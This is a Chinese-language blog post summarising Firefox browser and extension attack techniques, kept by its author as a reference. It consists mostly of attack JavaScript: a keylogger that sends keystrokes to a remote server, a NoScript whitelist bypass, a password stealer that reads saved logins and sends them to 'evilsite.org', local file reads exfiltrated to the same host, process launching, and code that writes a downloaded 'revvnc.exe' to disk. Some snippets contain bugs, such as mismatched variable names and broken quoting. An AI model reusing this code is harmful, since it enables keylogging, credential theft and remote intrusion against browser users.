
# Firefox 攻击技巧总结

> 原文：[`www.pediy.com/kssd/pediy12/134012.html`](https://www.pediy.com/kssd/pediy12/134012.html)

在阅读《ClubHACK》黑客杂志时，看到一篇关于 Firefox 浏览器攻击手法的文章，标题为《Mozilla Firefox Internals & Attack Strategies》，里面提供有多份 javascript 代码，用于实现 Firefox 浏览器下的脚本攻击。本文对此作个简单记录留作备忘，以后需要用到时方便回头查阅，并参考其它资料作一总结性记录。

## 一、Key Logger

// 先在 Mozilla Firefox 中用 `addEventListener` 为 `keypress` 事件注册一个事件处理程序，这里为 `onkey` 函数，以此实现键盘记录功能。

```
document.addEventListener("keypress", onkey,false);

var keys='';

function onkey(e){
    keyss += String.fromCharCode(e.charCode); // 将按键码转换为字符
    if (keys.length>20){
    // 利用 XMLHTTP 请求向远程网站发送记录下的按键字符
    http=new XMLHttpRequest();
    url = "http://***********.com/prasannak/ler****.php?keylog="+keyss+"\n";
    http.open("GET",url,false);
    http.send(null);
    keyss='';
    }
  }
```

## 二、No-Script Bypass

利用 XPCOM（跨平台组件对象模型）中的类和组件来向将恶意站点添加到 no-script 白名单中，以此绕过 no-script 插件的保护。

// 其中 `let` 关键字只在 Firefox 或者其它基于 mozilla 的浏览器中有效，它代表着类似局部变量的意义，具体可参考这里：
// `https://developer.mozilla.org/en/New_in_JavaScript_1.7#let_statement`

```
let Sub_btn = {
    onCommand: function(event) {
        // 创建 preferences-service 实例
        var perfs =
        Components.classes["@mozilla.org/preferences-service;1"].    
        getService(Components.interfaces.nsIPrefService);
        // 获取“capability.policy.maonoscript.”子分支
        perfs = perfs.getBranch("capability.policy.maonoscript.");
        //向 no-script 白名单中添加恶意站点
        perfs.setCharPref("sites", "default noscript whitelisted sites + malicioussitehere.com”);");
      }
  }
```

## 三、Password Stealer

利用 XPCOM 来获取 `LoginManager` 中记录的登陆信息，以截取用户的登陆密码。

```
let HelloWorld = {
    onCommand: function(event) {
        // 创建 login-manager 实例
        var l2m =
        Components.classes["@mozilla.org/login-manager;1"].
        getService(Components.interfaces.nsILoginManager);
        // 获取所有被登陆管理器记录的信息
        alltheinfo = l2m.getAllLogins({});
        for (i=0; I<=alltheinfo.length; i=i+1){
            window.open('http://evilsite.org/?' 
                + unescape(alltheinfo[i].hostname) + '.' 
                + unescape(alltheinfo[i].username) + '.' 
                + unescape(alltheinfo[i].password));
        }
    }
} ;
```

## 四、攻击 DOM 与事件句柄

### Extension XUL Code

```
<script>
var customExtension = {
    customListener: function(evt) {
        // loadOverlay 函数不能发送基于 http 的 xul 请求，但允许来自“chrome:\\”的 xul 请求。
        document.loadOverlay(evt.target.getAttribute("url"), null);
    }
}
document.addEventListener("CustomEvent", function(e) {
    customExtension.customListener(e);
}, false, true);
</script>
```

### Malicious Web Location Code

```
<html>
<head>
<title>Test</title>
<script>
var element =
document.createElement("CustomExtensionDataElement");
element.setAttribute("url","chrome://hellooworld/content/q1.xul");
document.documentElement.appendChild(element);
var evt = document.createEvent("Events");
evt.initEvent("CustomEvent",true,false);
element.dispatchEvent(evt);
</script>
</head>
<body>
<p>
This Test Page </p>
</body>
</htmL>
```

## 五、Bypassing Wrappers

### Extension Code

```
function Test_Function()
{
    test = my_message
    if (test==null)
    {
        alert("Wrapper Exists")
    }
    else{
        alert(test);
        trim =
        window.content.wrappedJSObject.my_message1
        eval(trim);
    }
}
```

### Malicious Website Code

```
<html>
<head>
<title>Test</title>
<script>
var dir= "123";
my_message1="eval("eval(dirService =
Components.classes['@mozilla.org/file/directory_service;1'].
getService(Components.interfaces.nsIProperties);))
eval( homeDirFile = dirService.get('Home',
Components.interfaces.nsIFile);)
eval(homeDir = homeDirFile.path;)
eval(alert(homeDir);))"))"
</script>
</head>
<body>
<p>
This Test Page </p>
</body>
</htmL>
```

## 六、本地文件访问

```
var fileToRead="file:///C:/boot.ini"; 
var fileContents=document.ReadURL.readFile(fileToRead); 
setTimeout("",100); 
var remoteLocation="http://evilsite.org/" + unescape(fileContents); 
document.location=remoteLocation;
```

## 七、远程代码执行

```
var lFile = Components.classes["@mozilla.org/file/local;1"].
createInstance(Components.interfaces.nsILocalFile); 
var lPath = "/usr/bin/gnome-terminal"; 
lFile.initWithPath(lPath); 
var process = Components.classes["@mozilla.org/process/util;1"].
createInstance(Components.interfaces.nsIProcess); 
process.init(lFile); 
process.run(false,'','');
```

## 八、写文件系统

```
var xmlhttp;

function loadXMLDoc(url){
    xmlhttp=new XMLHttpRequest();
    xmlhttp.open("GET",url,false);
    xmlhttp.overrideMimeType('text/plain; charset=x-user-defined');
    xmlhttp.send(null);
    if (xmlhttp.status==200){
        setTimeout("",300);
        makefile(xmlhttp.responseText);
    }   
}   

function makefile(bdata){
var getWorkingDir= Components.classes["@mozilla.org/file/directory_service;1"].
getService(Components.interfaces.nsIProperties).
get("Home", Components.interfaces.nsIFile);
var aFile = Components.classes["@mozilla.org/file/local;1"].
createInstance(Components.interfaces.nsILocalFile);
aFile.initWithPath( getWorkingDir.path + "\\revvnc.exe" );
aFile.createUnique( Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 777);
var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"].
createInstance(Components.interfaces.nsIFileOutputStream);
stream.init(aFile, 0x04 | 0x08 | 0x20, 0777, 0);
stream.write(bdata, bdata.length);
 if (stream instanceof Components.interfaces.nsISafeOutputStream){
    stream.finish();
 } else{
    stream.close();
  }  
}
```
